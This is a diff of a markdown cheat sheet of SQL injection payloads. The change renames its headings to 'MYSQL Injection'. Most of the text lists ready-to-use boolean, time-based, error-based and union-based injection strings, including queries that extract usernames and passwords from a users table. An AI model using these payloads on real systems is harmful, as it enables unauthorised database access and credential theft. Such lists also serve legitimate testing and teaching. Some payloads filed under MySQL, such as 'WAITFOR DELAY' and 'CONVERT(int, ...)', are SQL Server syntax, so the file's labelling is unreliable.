@@ -1,30 +1,30 @@
-# SQL Injection Payloads
+# MYSQL Injection Payloads
 
 ## Introduction to SQL Injection
 SQL Injection (SQLi) is a type of attack on web applications that exploits weaknesses in how SQL queries are processed. By injecting malicious queries, an attacker can execute unwanted commands on the database, potentially compromising sensitive information.
 
-## Types of SQL Injection
+## Types of MYSQL Injection
 
-### Boolean-Based SQL Injection
+### Boolean-Based MYSQL Injection
 These payloads work by causing the SQL query to return a true or false value, allowing you to infer information about the database structure.
 - `' OR 1=1--`
 - `' OR 'x'='x`
 - `') OR ('1'='1`
 - `' OR 1=1#`
 
-### Time-Based SQL Injection
+### Time-Based MYSQL Injection
 These payloads use time delays to confirm if an SQL injection vulnerability exists. If the server responds after a noticeable delay, the vulnerability is confirmed.
 - `' OR IF(1=1, SLEEP(5), 0)--`
 - `' OR IF(1=1, SLEEP(10), 0)#`
 - `' OR 1=1 WAITFOR DELAY '0:0:5'--`
 
-### Error-Based SQL Injection
+### Error-Based MYSQL Injection
 These payloads force the database to return error messages, which can reveal valuable information about the database structure.
 - `' AND 1=CONVERT(int, (SELECT @@version))--`
 - `' UNION SELECT NULL, NULL, NULL, version()--`
 - `' AND 1=1 GROUP BY CONCAT(username,0x3a,password)--`
 
-### Union-Based SQL Injection
+### Union-Based MYSQL Injection
 This type of SQLi allows you to combine the results of two or more queries.
 - `' UNION SELECT null, username, password FROM users--`
 - `' UNION SELECT 1, @@version--`
